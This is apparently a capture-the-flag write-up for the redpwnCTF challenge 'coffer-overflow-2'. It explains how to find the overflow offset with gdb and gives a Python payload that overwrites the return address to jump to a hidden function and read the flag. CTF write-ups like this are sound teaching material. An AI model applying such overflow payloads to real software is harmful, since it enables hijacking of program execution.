---
layout: post
title: "coffer-overflow-2"
author: "vishalananth"
---

You'll have to jump to a function now!?

nc 2020.redpwnc.tf 31908

**Files**
- [coffer-overflow-2]({{site.baseurl}}/assets/coffer-overflow-2/coffer-overflow-2)

## Solution

Open the file in gdb with

```
gdb coffer-overflow-2
```

Test different payloads of different lengths. We find buffer flow at payload length of 25. We open the file with IDA Free Edition and locate
the address of the binFunction and see it is at ```0x00000000004006E6```. So we have to overflow the ip(Instruction Pointer) to this address. We can do that with the following payload

```
python -c "print 'a' * 24 + '\xe6\x06\x40\x00\x00\x00\x00\x00' + '\ncat flag.txt"
```

Giving this input, gets us the flag.
